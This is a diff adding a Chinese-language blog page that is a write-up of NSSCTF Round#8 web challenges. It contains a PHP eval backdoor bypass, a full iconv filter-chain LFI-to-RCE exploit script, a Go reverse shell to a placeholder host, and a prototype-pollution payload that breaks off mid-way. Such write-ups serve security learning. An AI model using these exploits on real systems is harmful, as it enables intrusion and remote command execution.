@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <meta name="description" content="NSSCTF Round#8 Basic" />
+    <meta name="hexo-theme-A4" content="v1.8.8" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>Hexo</title>
+
+    
+        
+<link rel="stylesheet" href="/css/highlight/style1.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+
+    
+        
+<link rel="stylesheet" href="/css/returnToLastPage.css">
+
+    
+    
+   
+<link rel="stylesheet" href="/css/lightgallery.min.css">
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .post-md pre, .post-md .highlight {
+            background: #212425;
+            color: white; 
+        }
+        pre .string, pre .value, pre .inheritance, pre .header, pre .ruby .symbol, pre .xml .cdata {
+            color: #000000;
+        }
+        pre .number, pre .preprocessor, pre .built_in, pre .literal, pre .params, pre .constant {
+            color: #000000;
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+        .return-to-last-progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .return-to-last-progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .return-to-last-progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+
+
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">Hexo</a> 
+            <span class="description"></span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            NSSCTF Round#8 Basic
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#MyDoor"><span class="post-toc-text">MyDoor</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#MyPage"><span class="post-toc-text">MyPage</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Upload-gogoggo"><span class="post-toc-text">Upload_gogoggo</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ez-node"><span class="post-toc-text">ez_node</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E8%A1%A5%E5%85%85"><span class="post-toc-text">补充</span></a></li></ol></li></ol>
+            
+        
+        <link rel="stylesheet" type="text/css" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="MyDoor"><a href="#MyDoor" class="headerlink" title="MyDoor"></a>MyDoor</h1><p>使用php伪协议读取index.php的代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/index.php?file=&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.|la|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现可以执行命令，因为php的特性如果执行给N_S.S传参，那么N_S.S在后端会被规范成N_S_S</p>
+<p>所以使用N[S.S来使后端得到的参数为N_S.S（具体原因自己去搜吧）</p>
+<p>我原本以为flag在主机里，找了半天结果在phpinfo …..</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?N[S.S=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302111606868.png" title="image-20230211160450357" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302111606868.png" alt="image-20230211160450357"></a></p>
+<h1 id="MyPage"><a href="#MyPage" class="headerlink" title="MyPage"></a>MyPage</h1><p>感觉部分源码和MyDoor是一样的，只是我尝试用伪协议读取index.php的时候没回显，所以猜测应该就是用了include来读取文件</p>
+<p>看到include，我就想起了zedd的一篇文章</p>
+<p>文章:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://tttang.com/archive/1395/">hxp CTF 2021 - The End Of LFI?</a></li>
+<li><a target="_blank" rel="noopener" href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">Solving “includer’s revenge” from hxp ctf 2021 without controlling any files</a></li>
+</ul>
+<p>直接使用exp，来执行命令，得到flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.143.7.127:28742/index.php?file=&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">command = <span class="string">&quot;cat flag.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>: <span class="string">&quot;include&quot;</span>,</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: final_payload</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302111611661.png" title="image-20230211161110547" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302111611661.png" alt="image-20230211161110547"></a></p>
+<h1 id="Upload-gogoggo"><a href="#Upload-gogoggo" class="headerlink" title="Upload_gogoggo"></a>Upload_gogoggo</h1><p>一个没有过滤的文件上传，且在上传后会执行<code>go</code>加上文件名<code>.</code>之前的字符串的命令，并且是对你上传的文件进行执行的，（猜的）</p>
+<p>eg:</p>
+<p>上传文件名为<code>run.go</code>，那么就会执行<code>go run run.go</code>，这样会执行go里的代码</p>
+<p>所以上传一个反弹shell的go文件</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	cmd := exec.Command(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &amp;&gt; /dev/tcp/vps/ip 0&gt;&amp;1&quot;</span>)</span><br><span class="line">	out, err := cmd.CombinedOutput()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="type">string</span>(out))</span><br><span class="line">		log.Fatalf(<span class="string">&quot;cmd.Run() failed with %s\n&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="type">string</span>(out))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后文件名为run.go，上传就可以得到shell</p>
+<p>谢队把flag藏到&#x2F;home了，挨打！</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302111627714.png" title="image-20230211162702683" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302111627714.png" alt="image-20230211162702683"></a></p>
+<h1 id="ez-node"><a href="#ez-node" class="headerlink" title="ez_node"></a>ez_node</h1><p>源码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&quot;multer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = process.<span class="property">env</span>.<span class="property">port</span> || <span class="number">3000</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">global</span> = <span class="string">&quot;global&quot;</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`listen at <span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> objMulter = <span class="title function_">multer</span>(&#123; <span class="attr">dest</span>: <span class="string">&quot;./upload&quot;</span> &#125;);</span><br><span class="line">app.<span class="title function_">use</span>(objMulter.<span class="title function_">any</span>());</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&quot;./public&quot;</span>));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/upload&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> oldName = req.<span class="property">files</span>[<span class="number">0</span>].<span class="property">path</span>;</span><br><span class="line">        <span class="keyword">let</span> newName = req.<span class="property">files</span>[<span class="number">0</span>].<span class="property">path</span> + path.<span class="title function_">parse</span>(req.<span class="property">files</span>[<span class="number">0</span>].<span class="property">originalname</span>).<span class="property">ext</span>;</span><br><span class="line">        fs.<span class="title function_">renameSync</span>(oldName, newName);</span><br><span class="line">        res.<span class="title function_">send</span>(&#123;</span><br><span class="line">            <span class="attr">err</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">url</span>:</span><br><span class="line">            <span class="string">&quot;./upload/&quot;</span> +</span><br><span class="line">            req.<span class="property">files</span>[<span class="number">0</span>].<span class="property">filename</span> +</span><br><span class="line">            path.<span class="title function_">parse</span>(req.<span class="property">files</span>[<span class="number">0</span>].<span class="property">originalname</span>).<span class="property">ext</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(error)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="built_in">require</span>(<span class="string">&#x27;./err.js&#x27;</span>).<span class="title function_">getRandomErr</span>())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/pollution&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(), <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> data = &#123;&#125;;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="title function_">merge</span>(data, req.<span class="property">body</span>);</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Register successfully!tql&#x27;</span>)</span><br><span class="line">        <span class="built_in">require</span>(<span class="string">&#x27;./err.js&#x27;</span>).<span class="title function_">getRandomErr</span>()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(error)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="built_in">require</span>(<span class="string">&#x27;./err.js&#x27;</span>).<span class="title function_">getRandomErr</span>())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>只有一个merge函数里可以进行原型链污染，而且从很多方面都可以看出来这个是原型链污染</p>
+<p>具体污染的地方是<a target="_blank" rel="noopener" href="https://github.com/nodejs/node/blob/c200106305f4367ba9ad8987af5139979c6cc40c/lib/internal/modules/cjs/loader.js#L454">https://github.com/nodejs/node/blob/c200106305f4367ba9ad8987af5139979c6cc40c/lib/internal/modules/cjs/loader.js#L454</a></p>
+<p>可以污染他来加载任意包从而执行任意命令</p>
+<p>根据出题人的本意是让我们上传一个包，然后去加载那个包，但是我是直接用的别人的exp，而且题目环境也包含exp里需要的文件，所以直接打就行</p>
+<p>给&#x2F;pollution路由传数据</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./err.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;exports&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./preinstall.js&quot;</span></span><br><span class="line">		<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/opt/yarn-v1.22.19&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span 